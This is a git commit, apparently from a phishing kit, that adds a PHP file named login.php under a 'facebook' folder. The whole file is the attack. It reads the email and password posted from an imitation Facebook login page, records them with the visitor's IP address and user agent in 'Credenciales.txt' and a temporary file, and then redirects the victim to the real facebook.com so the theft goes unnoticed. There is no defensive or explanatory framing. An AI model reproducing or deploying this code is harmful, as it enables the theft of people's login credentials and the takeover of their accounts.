cfdd6f322bf0f9e9364ae20c1d57eac5cda15036
Anonymous Iberoamerica <68979892+AnonIbero@users.noreply.github.com>
2020-09-10 15:01:06 -0500

    Add files via upload

---
+++ paginas/facebook/login.php
@@ -0,0 +1,30 @@
+<?php 
+
+function saludo() {
+    $usuario = $_POST["email"];
+    $nuevaURL = "https://facebook.com";
+    $_SERVER['REMOTE_ADDR'];
+    $IP = $_SERVER['HTTP_X_FORWARDED_FOR'];
+    $AGENT = $_SERVER['HTTP_USER_AGENT'];
+    $contraseña = $_POST["pass"];
+
+    $archivo = fopen("Credenciales.txt", "a+");
+    fwrite($archivo, "\nUsuario: $usuario\n");
+    fwrite($archivo, "Contraseña: $contraseña\n");
+    fwrite($archivo, "Direccion IP: $IP\n");
+    fwrite($archivo, "Agente: $AGENT\n");
+
+    $temporal = fopen("temporal.txt", "w");
+    fwrite($temporal, "\nUsuario: $usuario\n");
+    fwrite($temporal, "Contraseña: $contraseña\n");
+    fwrite($temporal, "Direccion IP: $IP\n");
+    fwrite($temporal, "Agente: $AGENT\n");
+    header("Location: $nuevaURL");
+    die();
+    
+}
+
+saludo();
+
+
+?>
